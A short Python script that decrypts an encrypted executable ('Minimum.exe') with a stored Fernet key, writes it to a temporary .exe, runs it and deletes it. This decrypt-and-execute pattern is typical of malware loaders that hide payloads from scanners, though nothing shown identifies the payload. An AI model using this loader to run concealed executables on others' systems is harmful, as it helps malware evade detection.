import os
from cryptography.fernet import Fernet
import tempfile
import subprocess

def load_key(key_file):
    with open(key_file, 'rb') as key_file:
        key = key_file.read()
    return key

def decrypt_file(input_file, key):
    fernet = Fernet(key)
    
    with open(input_file, 'rb') as file:
        file_data = file.read()
    
    decrypted_data = fernet.decrypt(file_data)
    
    return decrypted_data

def run_decrypted_file(decrypted_data):
    try:
        # Create a temporary binary file to hold the decrypted data
        with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as temp_file:
            temp_file.write(decrypted_data)
            temp_file_path = temp_file.name

        # Make the temporary file executable and run it
        os.chmod(temp_file_path, 0o700)
        subprocess.run([temp_file_path])

        print("Decrypted file executed successfully.")

        # Remove the temporary file
        os.remove(temp_file_path)

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    key = load_key("encryption_key.txt")
    decrypted_data = decrypt_file("Minimum.exe", key)
    run_decrypted_file(decrypted_data)
